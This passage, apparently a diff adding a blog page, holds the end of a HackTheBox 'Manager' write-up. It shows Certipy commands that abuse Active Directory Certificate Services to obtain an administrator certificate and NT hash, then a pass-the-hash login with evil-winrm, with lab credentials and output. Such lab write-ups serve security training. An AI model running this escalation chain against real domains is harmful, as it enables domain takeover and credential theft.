+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager/sysinternals]
+</span></span><span class="line"><span class="cl">└─$ certipy ca -ca &#39;manager-DC01-CA&#39; -issue-request 15 -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39;
+</span></span><span class="line"><span class="cl">Certipy v4.8.0 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Successfully issued certificate
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Lastly, we can retrieve the issued certificate, giving us <code>administrator.pfx</code>. Note that this pfx is related to the -upn accound we provided previously.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager/sysinternals]
+</span></span><span class="line"><span class="cl">└─$ certipy req -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -ca &#39;manager-DC01-CA&#39; -target manager.htb -retrieve 15
+</span></span><span class="line"><span class="cl">Certipy v4.8.0 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Rerieving certificate with ID 15
+</span></span><span class="line"><span class="cl">[*] Successfully retrieved certificate
+</span></span><span class="line"><span class="cl">[*] Got certificate with UPN &#39;administrator@manager.htb&#39;
+</span></span><span class="line"><span class="cl">[*] Certificate has no object SID
+</span></span><span class="line"><span class="cl">[*] Loaded private key from &#39;15.key&#39;
+</span></span><span class="line"><span class="cl">[*] Saved certificate and private key to &#39;administrator.pfx&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now with the pfx file acquired, we can return back to <code>certipy</code> and use it for authorization!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager]
+</span></span><span class="line"><span class="cl">└─$ certipy auth -pfx &#39;administrator.pfx&#39; -username &#39;administrator&#39; -domain &#39;manager.htb&#39; -dc-ip 10.129.153.73
+</span></span><span class="line"><span class="cl">Certipy v4.8.0 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Using principal: administrator@manager.htb
+</span></span><span class="line"><span class="cl">[*] Trying to get TGT...
+</span></span><span class="line"><span class="cl">[*] Got TGT
+</span></span><span class="line"><span class="cl">[*] Saved credential cache to &#39;administrator.ccache&#39;
+</span></span><span class="line"><span class="cl">[*] Trying to retrieve NT hash for &#39;administrator&#39;
+</span></span><span class="line"><span class="cl">[*] Got hash for &#39;administrator@manager.htb&#39;: aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With the NT hash, we can employ pass the hash in evil-winrm, and authenticate as administrator.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager]
+</span></span><span class="line"><span class="cl">└─$ evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.5
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/active-directory/">Active Directory</a>
+        
+            <a href="/tags/kerbrute/">Kerbrute</a>
+        
+            <a href="/tags/mssql/">MSSQL</a>
+        
+            <a href="/tags/bloodhound/">Bloodhound</a>
+        
+            <a href="/tags/active-directory-certificate-services/">Active Directory Certificate Services</a>
+        
+            <a href="/tags/certipy/">Certipy</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-devvortex/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-devvortex/Devvortex.61ba3466bff8da52f89d2bb6417fb83a_hu4257021157125360887.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Devvortex"
+                        
+                        data-hash="md5-Ybo0Zr/42lL4nSu2QX&#43;4Og==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Devvortex</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-surveillance/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-surveillance/Surveillance.8b9fd8fd814572f9ed8f343a005ca93c_hu1936471103572467903.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Surveillance"
+                        
+                        data-hash="md5-i5/Y/YFFcvntjzQ6AFypPA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Surveillance</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-hospital/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-hospital/Hospital.dd28dc96da49df800b952a77639d4857_hu7748615803054416032.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Hospital"
+                        
+                        data-hash="md5-3SjcltpJ34ALlSp3Y51IVw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Hospital</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-codify/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-codify/Codify.d19bf609d86d6ee490cdde52cb652366_hu5530218627868483871.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Codify"
+                        
+                        data-hash="md5-0Zv2CdhtbuSQzd5Sy2UjZg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Codify</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-analytics/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-analytics/Analytics.b761a640e4211a48e503c55ca0e36d11_hu18004703824071439858.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Analytics"
+                        
+                        data-hash="md5-t2GmQOQhGkjlA8VcoONtEQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Analytics</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
